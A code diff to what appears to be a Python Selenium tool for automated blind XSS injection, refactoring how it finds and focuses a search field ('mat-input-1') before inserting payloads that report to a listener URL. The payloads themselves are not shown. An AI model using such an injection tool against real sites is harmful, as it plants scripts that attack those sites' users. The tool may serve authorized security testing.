@@ -352,31 +352,41 @@ def blind_xss_injection(campos_validos, driver, url_ouvinte):
                     payload = payloads[0] if payload_type == 'img' else \
                              payloads[1] if payload_type == 'svg' else payloads[2]
                     
-                    # Campo já foi validado pelo eco_test, só precisa encontrar novamente
-                    input_field = None
-                    
-                    if element['id']:
-                        input_field = driver.find_element(By.ID, element['id'])
-                    elif element['name']:
-                        input_field = driver.find_element(By.NAME, element['name'])
-                    
-                    if not input_field:
-                        continue
-                    
                     # Tratamento especial apenas para mat-input-1 (já foi validado pelo eco_test)
                     if element.get('id') == 'mat-input-1':
-                        # Força a ativação da barra de pesquisa
                         try:
-                            search_icon = driver.find_element(By.XPATH, "//mat-icon[text()='search']")
-                            search_icon.click()
-                            time.sleep(1)
-                        except:
-                            pass
-                        
-                        # Força o foco usando JavaScript
-                        driver.execute_script("arguments[0].focus();", input_field)
-                        driver.execute_script("arguments[0].click();", input_field)
-                        time.sleep(0.5)
+                            # Força a ativação da barra de pesquisa ANTES de tentar encontrar o elemento
+                            try:
+                                search_icon = driver.find_element(By.XPATH, "//mat-icon[text()='search']")
+                                search_icon.click()
+                                time.sleep(1)
+                            except:
+                                pass
+                            
+                            # Agora sim, aguarda até este campo ficar ativo (igual ao eco_test)
+                            input_field = WebDriverWait(driver, 10).until(
+                                EC.element_to_be_clickable((By.ID, "mat-input-1"))
+                            )
+                            
+                            # Força o foco usando JavaScript
+                            driver.execute_script("arguments[0].focus();", input_field)
+                            driver.execute_script("arguments[0].click();", input_field)
+                            time.sleep(0.5)
+                            
+                        except Exception as e:
+                            print(f"[!] Campo de busca mat-input-1 não pode ser ativado: {str(e)}")
+                            continue
+                    else:
+                        # Para outros campos, encontra normalmente
+                        if element['id']:
+                            input_field = driver.find_element(By.ID, element['id'])
+                        elif element['name']:
+                            input_field = driver.find_element(By.NAME, element['name'])
+                    
+                    # Verifica se conseguiu encontrar/ativar o campo
+                    if not input_field:
+                        print(f"[!] Não foi possível encontrar o campo {field_name}")
+                        continue
                     
                     # Injeção do payload blind XSS
                     input_field.clear()
